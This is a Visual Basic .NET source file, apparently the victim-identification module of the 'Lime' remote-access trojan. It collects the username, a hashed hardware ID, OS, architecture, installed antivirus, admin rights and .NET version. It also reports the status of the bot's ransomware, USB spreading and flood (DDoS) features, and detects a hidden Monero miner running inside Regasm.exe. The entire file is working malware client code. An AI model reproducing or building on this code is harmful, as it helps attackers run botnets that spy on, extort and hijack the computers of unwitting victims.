Namespace Lime

    Public Class C_ID 'This Class is all about client identifier functions
        Private Shared SPL = C_Settings.SPL

        Public Shared Function Bot()
            Try
                Return UserName() & "_" & HWID()
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function UserName()
            Try
                Return Environment.UserName
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function MyOS()
            Try
                Return My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
            Catch ex As Exception
                Return "Unkown"
            End Try
        End Function

        Public Shared Function Bit()
            Try
                If Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("64") Then
                    Return "x64"
                Else
                    Return "x86"
                End If
            Catch ex As Exception
                Return "*"
            End Try
        End Function

        Public Shared Function INDATE() As String
            Try
                Dim file As New IO.FileInfo(Windows.Forms.Application.ExecutablePath)
                Return file.LastWriteTime.ToString("dd/MM/yyy")
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function HWID() As String 'http://www.codeproject.com/Articles/28678/Generating-Unique-Key-Finger-Print-for-a-Computer
            Try
                Dim tohash As String = Identifier("Win32_Processor", "ProcessorId")
                tohash += "-" & Identifier("Win32_BIOS", "SerialNumber")
                tohash += "-" & Identifier("Win32_BaseBoard", "SerialNumber")
                tohash += "-" & Identifier("Win32_VideoController", "Name")
                Return MD5HASH(tohash)
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Private Shared Function Identifier(ByVal wmiClass As String, ByVal wmiProperty As String) As String
            Try
                Dim result As String = ""
                Dim mc As Management.ManagementClass = New Management.ManagementClass(wmiClass)
                Dim moc As Management.ManagementObjectCollection = mc.GetInstances()
                For Each mo As Management.ManagementObject In moc
                    If result = "" Then
                        Try
                            result = mo(wmiProperty).ToString()
                            Exit For
                        Catch
                        End Try
                    End If
                Next
                Return result
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function MD5HASH(ByVal input As String) As String
            Try
                Dim md5 As Security.Cryptography.MD5CryptoServiceProvider = New Security.Cryptography.MD5CryptoServiceProvider()
                Dim temp As Byte() = md5.ComputeHash(Text.Encoding.UTF8.GetBytes(input))
                Dim sb As Text.StringBuilder = New Text.StringBuilder()
                For i As Integer = 10 To temp.Length - 1
                    sb.Append(temp(i).ToString("x2"))
                Next
                Return sb.ToString().ToUpper()
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function Rans()
            Try
                If GTV("Rans-Status") = Nothing Then
                    STV("Rans-Status", "Not encrypted")
                    Return "Not encrypted"
                Else
                    Return GTV("Rans-Status")
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function USBSP()
            If C_Settings.USB = True Then
                Try
                    If GTV("USB") = Nothing Then
                        STV("USB", "Not ready")
                        Return GTV("USB")
                    Else
                        Return GTV("USB")
                    End If
                Catch ex As Exception
                    Return "Error"
                End Try
            ElseIf Not C_Settings.USB AndAlso Not C_Settings.PIN Then
                Return "Disabled"
            Else
                Return "Not ready"
            End If
        End Function

        Public Shared Function AV() As String
            Try
                Dim str As String = Nothing
                Dim searcher As New Management.ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
                Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
                For Each queryObj As Management.ManagementObject In instances
                    str = queryObj("displayName").ToString()
                Next
                If str = String.Empty Then str = "N/A"
                str = str.ToString
                Return str
                searcher.Dispose()
            Catch
                Return "N/A"
            End Try
        End Function

        Public Shared Function Privileges() As Boolean
            Try
                Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
                Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
                If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                    Return True
                Else
                    Return False
                End If
            Catch ex As Exception
                Return False
            End Try
        End Function

        Public Shared Function XMR() As String
            Try

                Dim p() As Diagnostics.Process
                p = Diagnostics.Process.GetProcessesByName("Regasm")
                If p.Length > 0 Then
                    Try
                        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe")
                        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
                        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
                        For Each retObject As Management.ManagementObject In retObjectCollection
                            If retObject("CommandLine").ToString.Contains("--donate-level=") Then
                                Return "Minning..."
                            End If
                        Next
                    Catch ex As Exception
                    End Try
                Else
                    Return CPU_GPU()
                End If
            Catch ex As Exception
            End Try
        End Function

        Public Shared Function Flood()
            Try
                If GTV("Flood") = Nothing Then
                    STV("Flood", " ")
                End If

                Return GTV("Flood")
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function CPU_GPU() As String
            Try
                'Dim VideoCard As String = ""
                'Dim objquery As New Management.ObjectQuery("SELECT * FROM Win32_VideoController")
                'Dim objSearcher As New Management.ManagementObjectSearcher(objquery)

                'For Each MemObj As Management.ManagementObject In objSearcher.Get
                '    VideoCard = VideoCard & (MemObj("Name")) & " "
                'Next
                'If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                '    Return VideoCard
                'End If

                Dim P As New Management.ManagementObject("Win32_Processor.deviceid=""CPU0""")
                P.Get()
                If P("Name").ToString.Contains("Intel") Then
                    Return P("Name").ToString.Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "")
                End If
                Return P("Name").ToString

            Catch ex As Exception
                Return "Unknow"
            End Try

        End Function

        Public Shared Function dotNET() As String
            Try
                Dim dot As New Text.StringBuilder
                For Each x In IO.Directory.GetDirectories(Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory().Substring(0, 34))
                    If x.Contains("v4.0") Then
                        dot.Append("v4.0")
                    ElseIf x.Contains("v2.0") Then
                        dot.Append("v2.0 ")
                    End If
                Next
                Return dot.ToString
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

    End Class

End Namespace
